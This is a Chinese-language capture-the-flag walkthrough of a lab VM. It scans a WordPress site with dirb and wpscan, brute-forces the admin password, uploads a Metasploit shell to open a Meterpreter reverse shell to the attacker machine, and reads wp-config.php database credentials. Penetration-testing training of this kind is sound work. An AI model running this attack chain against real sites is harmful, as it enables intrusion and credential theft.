<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.108/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Jan 12 20:42:40 2020</span><br><span class="line">URL_BASE: http://192.168.56.108/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.108/ ----</span><br><span class="line">+ http://192.168.56.108/index.html (CODE:200|SIZE:10918)                                              </span><br><span class="line">+ http://192.168.56.108/info.php (CODE:200|SIZE:84111)                                                </span><br><span class="line">+ http://192.168.56.108/server-status (CODE:403|SIZE:279)                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/                                                       </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/index.php (CODE:301|SIZE:0)                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-content/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-includes/                                           </span><br><span class="line">+ http://192.168.56.108/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                       </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/css/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/images/                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/includes/                                     </span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/js/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/maint/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/network/                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/user/                                         </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-content/index.php (CODE:200|SIZE:0)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-content/plugins/                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-content/themes/                                     </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                        </span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                        </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                           </span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                      </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0) </span><br></pre></td></tr></table></figure>

<p>有很多页面，结果显示CMS是wordpress，因此，可以使用wpscan浏览提到wordpress的两个指定页面。为此，请使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/wordpress/ --enumerate</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.6</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://192.168.56.108/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Sun Jan 12 20:45:08 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.3 identified (Insecure, released on 2019-11-12).</span></span><br><span class="line"><span class="string"> | Found By: Emoji Settings (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.108/wordpress/, Match: &#x27;</span>wp-includes\/js\/wp-emoji-release.min.js?ver=5.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> | Confirmed By: Meta Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.108/wordpress/, Match: &#x27;</span>WordPress 5.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] The main theme could not be detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No plugins Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:00 &lt;=======================&gt; (320 / 320) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No themes Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:01 &lt;=====================&gt; (2568 / 2568) 100.00% Time: 00:00:01</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Timthumbs Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:00 &lt;==========================&gt; (21 / 21) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking DB Exports - Time: 00:00:00 &lt;==============================&gt; (36 / 36) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No DB Exports Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span></span><br><span class="line"><span class="string"> Brute Forcing Attachment IDs - Time: 00:00:00 &lt;===================&gt; (100 / 100) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Medias Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] bossperson</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Sun Jan 12 20:45:16 2020</span></span><br><span class="line"><span class="string">[+] Requests Done: 3094</span></span><br><span class="line"><span class="string">[+] Cached Requests: 4</span></span><br><span class="line"><span class="string">[+] Data Sent: 840.6 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 567.645 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 183.743 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:07</span></span><br></pre></td></tr></table></figure>

<p>得到user为bossperson,同样，让枚举另一页。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/so-dev-wordpress/ -U bossperson -P /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">Trying bossperson / zoom Time: 00:00:27 &lt;========================&gt; (4614 / 4614) 100.00% Time: 00:00:27</span><br><span class="line"></span><br><span class="line">[i] No Valid Passwords Found.</span><br></pre></td></tr></table></figure>

<p>找不到任何密码，但是不用担心，因为可以在另一页上运行相同的命令，请输入以下内容进行尝试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/so-dev-wordpress/ --enumerate</span></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] mike</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>找到用户名之后，运行下面的命令爆破密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/so-dev-wordpress/ -U admin,mike -P /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line">[+] Performing password attack on Wp Login against 2 user/s</span><br><span class="line">[SUCCESS] - admin / admin1                                                                             </span><br><span class="line">Trying mike / zope Time: 00:00:36 &lt;==============================&gt; (4914 / 4914) 100.00% Time: 00:00:36</span><br><span class="line"></span><br><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> | Username: admin, Password: admin1</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>得到admin/admin1,终于找到了用户admin的密码。现在，使用msfconsole上传shell。通过Metasploit，使用exploit/unix/webapp/wp_admin_shell_upload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">  Metasploit Park, System Security Interface                                                           </span><br><span class="line">  Version 4.0.5, Alpha E                                                                               </span><br><span class="line">  Ready...                                                                                             </span><br><span class="line">  &gt; access security                                                                                    </span><br><span class="line">  access: PERMISSION DENIED.</span><br><span class="line">  &gt; access security grid</span><br><span class="line">  access: PERMISSION DENIED.</span><br><span class="line">  &gt; access main security grid</span><br><span class="line">  access: PERMISSION DENIED....and...</span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!</span></span><br><span class="line"><span class="string">  YOU DIDN&#x27;</span>T SAY THE MAGIC WORD!                                                                       </span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!                                                                       </span></span><br><span class="line"><span class="string">  YOU DIDN&#x27;</span>T SAY THE MAGIC WORD!                                                                       </span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!                                                                       </span></span><br><span class="line"><span class="string">  YOU DIDN&#x27;</span>T SAY THE MAGIC WORD!                                                                       </span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!                                                                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.68-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1957 exploits - 1093 auxiliary - 336 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 &gt; use exploit/unix/webapp/wp_admin_shell_upload</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set Pa</span></span><br><span class="line"><span class="string">set PaSSWORD  set PaYLOAD   </span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PA</span></span><br><span class="line"><span class="string">set PASSWORD  set PAYLOAD   </span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PASSWORD admin1</span></span><br><span class="line"><span class="string">PASSWORD =&gt; admin1</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set USERNAME admin</span></span><br><span class="line"><span class="string">USERNAME =&gt; admin</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhost 192.168.56.108</span></span><br><span class="line"><span class="string">rhost =&gt; 192.168.56.108</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGET</span></span><br><span class="line"><span class="string">set TARGET     set TARGETURI  </span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGETURI /so-dev-wordpress</span></span><br><span class="line"><span class="string">TARGETURI =&gt; /so-dev-wordpress</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.56.102:4444 </span></span><br><span class="line"><span class="string">[*] Authenticating with WordPress using admin:admin1...</span></span><br><span class="line"><span class="string">[+] Authenticated with WordPress</span></span><br><span class="line"><span class="string">[*] Preparing payload...</span></span><br><span class="line"><span class="string">[*] Uploading payload...</span></span><br><span class="line"><span class="string">[*] Executing the payload at /so-dev-wordpress/wp-content/plugins/RnhGIdzuxq/oElblRDrKY.php...</span></span><br><span class="line"><span class="string">[*] Sending stage (38288 bytes) to 192.168.56.108</span></span><br><span class="line"><span class="string">[*] Meterpreter session 1 opened (192.168.56.102:4444 -&gt; 192.168.56.108:60668) at 2020-01-12 22:03:59 -0500</span></span><br><span class="line"><span class="string">[+] Deleted oElblRDrKY.php</span></span><br><span class="line"><span class="string">[+] Deleted RnhGIdzuxq.php</span></span><br><span class="line"><span class="string">[+] Deleted ../RnhGIdzuxq</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt; id</span></span><br><span class="line"><span class="string">[-] Unknown command: id.</span></span><br><span class="line"><span class="string">meterpreter &gt; sysinfo</span></span><br><span class="line"><span class="string">Computer    : inplainsight</span></span><br><span class="line"><span class="string">OS          : Linux inplainsight 5.3.0-23-generic #25-Ubuntu SMP Tue Nov 12 09:22:33 UTC 2019 x86_64</span></span><br><span class="line"><span class="string">Meterpreter : php/linux</span></span><br></pre></td></tr></table></figure>

<p>成功使用msf拿到了shell，获得标准输出的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1396 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">sh: 0: getcwd() failed: No such file or directory</span><br><span class="line">sh: 0: getcwd() failed: No such file or directory</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">sh: 0: getcwd() failed: No such file or directory</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>探索</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">akismet  hello.php  index.php</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/html/so-dev-wordpress/wp-content/plugins</span><br><span class="line">$ </span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ../..</span><br><span class="line"><span class="built_in">cd</span> ../..</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">index.php        wp-blog-header.php    wp-cron.php        wp-mail.php</span><br><span class="line">license.txt      wp-comments-post.php  wp-includes        wp-settings.php</span><br><span class="line">readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php</span><br><span class="line">wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php</span><br><span class="line">wp-admin         wp-content            wp-login.php       xmlrpc.php</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/html/so-dev-wordpress</span><br><span class="line">$ cat wp-config.php</span><br><span class="line">cat wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>sodevwp<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>sodevwp<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>oZ2R3c2x7dLL6<span class="comment">#hJ&#x27; );</span></span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database Charset to use <span class="keyword">in</span> creating database tables. */</span><br><span class="line">define( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** The Database Collate <span class="built_in">type</span>. Don<span class="string">&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_COLLATE<span class="string">&#x27;, &#x27;</span><span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**#@+</span></span><br><span class="line"><span class="string"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="string"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="string"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @since 2.6.0</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">define( &#x27;</span>AUTH_KEY<span class="string">&#x27;,         &#x27;</span>b_P&gt;20/J+HW!D1-[XI1~~abSjE~8do)Rp]jt/~Q0s-6/!U,Norv&#123;.+1xOh5+gnPr<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>SECURE_AUTH_KEY<span class="string">&#x27;,  &#x27;</span>nbfna5q3cP5/Gfaa`H`4&#123;SklZTx+inPmf*uh!boz=K`bUSldsl?m`-&#123;0FZ9Kdw4$<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>LOGGED_IN_KEY<span class="string">&#x27;,    &#x27;</span>UC8f4&#123;^Z[9co/&gt;[n*opw @Dtss(?~[dBQ/Xtbm8&amp;/rx1&#123;=Y^obQY`DE7ZYmHwSQT<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>NONCE_KEY<span class="string">&#x27;,        &#x27;</span>Z)O2rZ_IT6fNshPKa^RB:2?EU%a|tV91z,mWU<span class="variable">$rfsoFnbUVKp4l</span>;+z lrN4~T(9h<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>AUTH_SALT<span class="string">&#x27;,        &#x27;</span>]C-xQeq^*m$<span class="variable">$yt</span>:oLqg&gt;b?+teMLO7~&lt;<span class="comment">#|j@(n/K~L!4 n&#123;UCp%|$;;[_@6u]PHxT&#x27; );</span></span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;(rtGT9%Jv uX95E&amp;!tdiTZ7X19u:ak_B_L@YOeRq6eLf.bWV&#123;7|0Kn2JjOmk~[~l&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;1cC3onJs2/0; 5R91DS]m&gt;i|-P1&lt;SaQqUN3Lg`u|4&#123;]aH826Fnt*,[RY?&#123;y0JGeG&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;6a?qf^w0Q1D&#123;%!Y_HIO&amp;#Kc-p19/p8~#*Zo~6NHyZqSgL7ws6=Vdg|*Hijk&lt;7T4&#123;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;sodevwp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27; );</span></span><br></pre></td></tr></table></figure>

<p>现在有了数据库用户名和密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/** The name of the database <span class="keyword">for</span> WordPress */</span><br><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;sodevwp&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;sodevwp&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;oZ2R3c2x7dLL6#hJ&#x27;</span> );</span><br></pre></td></tr></table></figure>

